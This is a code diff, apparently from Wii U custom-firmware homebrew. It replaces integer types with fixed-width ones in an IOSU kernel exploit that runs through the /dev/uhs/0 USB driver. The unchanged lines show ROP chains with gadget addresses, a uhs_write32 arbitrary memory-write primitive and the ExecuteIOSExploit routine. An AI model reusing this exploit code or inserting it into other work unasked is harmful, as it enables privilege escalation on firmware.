@@ -19,20 +19,20 @@ https://raw.githubusercontent.com/dimok789/mocha/
 #define ARM_CODE_BASE       0x08135000
 #define REPLACE_SYSCALL     0x081298BC
 
-//extern const u8 launch_image_tga[];
-//extern const u32 launch_image_tga_size;
+//extern const uint8_t launch_image_tga[];
+//extern const uint32_t launch_image_tga_size;
 
-static void uhs_exploit_init(int uhs_handle, cfw_config_t * config);
-static int uhs_write32(int uhs_handle, int arm_addr, int val);
+static void uhs_exploit_init(int32_t uhs_handle, cfw_config_t * config);
+static int32_t uhs_write32(int32_t uhs_handle, int32_t arm_addr, int32_t val);
 
 //!------Variables used in exploit------
-static int *pretend_root_hub = (int*)0xF5003ABC;
-static int *ayylmao = (int*)0xF4500000;
+static int32_t *pretend_root_hub = (int32_t*)0xF5003ABC;
+static int32_t *ayylmao = (int32_t*)0xF4500000;
 //!-------------------------------------
 
 typedef struct {
-    u32 size;
-    u8 data[0];
+    uint32_t size;
+    uint8_t data[0];
 } payload_info_t;
 
 /* YOUR ARM CODE HERE (starts at ARM_CODE_BASE) */
@@ -45,7 +45,7 @@ typedef struct {
 
 
 /* ROP CHAIN STARTS HERE (0x1015BD78) */
-static const unsigned int final_chain[] = {
+static const uint32_t final_chain[] = {
     0x101236f3,        // 0x00      POP {R1-R7,PC}
     0x0,               // 0x04      arg
     0x0812974C,        // 0x08      stackptr     CMP R3, #1; STREQ R1, [R12]; BX LR
@@ -236,7 +236,7 @@ static const unsigned int final_chain[] = {
     REPLACE_SYSCALL,        // 0x1DC     start of syscall IOS_GetUpTime64
     0x4001,            // 0x1E0     on > 0x4000 it flushes all data caches
     0x0,               // 0x1E0
-    0x1012ED4C,        // 0x1E4     IOS_FlushDCache(void *ptr, unsigned int len)
+    0x1012ED4C,        // 0x1E4     IOS_FlushDCache(void *ptr, uint32_t len)
     0x0,               // 0x1DC
     0x0,               // 0x1E0
     0x10123a9f,        // 0x1E4     POP {R0,R1,R4,PC}
@@ -258,7 +258,7 @@ static const unsigned int final_chain[] = {
     0x101312D0,
 };
 
-static const int second_chain[] = {
+static const int32_t second_chain[] = {
     0x10123a9f, // 0x00         POP {R0,R1,R4,PC}
     CHAIN_START + 0x14 + 0x4 + 0x20 - 0xF000,     // 0x04         destination
     0x0,        // 0x08
@@ -311,7 +311,7 @@ static const int second_chain[] = {
     0x1012EA68, // 0xAC         stack pivot
 };
 
-static void uhs_exploit_init(int dev_uhs_0_handle, cfw_config_t * config) {
+static void uhs_exploit_init(int32_t dev_uhs_0_handle, cfw_config_t * config) {
     ayylmao[5] = 1;
     ayylmao[8] = 0x500000;
 
@@ -370,23 +370,23 @@ static void uhs_exploit_init(int dev_uhs_0_handle, cfw_config_t * config) {
     DCStoreRange((void*)0xF4120000, sizeof(second_chain));
     DCStoreRange((void*)0xF4130000, sizeof(final_chain));
     DCStoreRange((void*)0xF4140000, sizeof(ios_kernel_bin));
-    DCStoreRange((void*)0xF4148000, ((u32)payloads) - 0xF4148000);
+    DCStoreRange((void*)0xF4148000, ((uint32_t)payloads) - 0xF4148000);
 }
 
-static int uhs_write32(int dev_uhs_0_handle, int arm_addr, int val) {
+static int32_t uhs_write32(int32_t dev_uhs_0_handle, int32_t arm_addr, int32_t val) {
     ayylmao[520] = arm_addr - 24;                    //!  The address to be overwritten, minus 24 bytes
     DCStoreRange(ayylmao, 521 * 4);                  //!  Make CPU fetch new data (with updated adress)
     OSSleepTicks(0x200000);                          //!  Improves stability
-    int request_buffer[] = { -(0xBEA2C), val };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
-    int output_buffer[32];
+    int32_t request_buffer[] = { -(0xBEA2C), val };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
+    int32_t output_buffer[32];
     return IOS_Ioctl(dev_uhs_0_handle, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
 }
 
-int ExecuteIOSExploit(cfw_config_t * config) {
+int32_t ExecuteIOSExploit(cfw_config_t * config) {
     DEBUG_FUNCTION_LINE("Running ExecuteIOSExploit\n");
-    int iosuhaxFd = IOS_Open("/dev/iosuhax", 0);
+    int32_t iosuhaxFd = IOS_Open("/dev/iosuhax", 0);
     if(iosuhaxFd >= 0) {
-        int dummy = 0;
+        int32_t dummy = 0;
 
         IOS_Ioctl(iosuhaxFd, 0x03, &dummy, sizeof(dummy), &dummy, sizeof(dummy));
 
@@ -397,7 +397,7 @@ int ExecuteIOSExploit(cfw_config_t * config) {
     }
 
     //! execute exploit
-    int dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0);
+    int32_t dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0);
     if(dev_uhs_0_handle < 0) {
         DEBUG_FUNCTION_LINE("Failed to open \"/dev/uhs/0\"\n");
         return dev_uhs_0_handle;
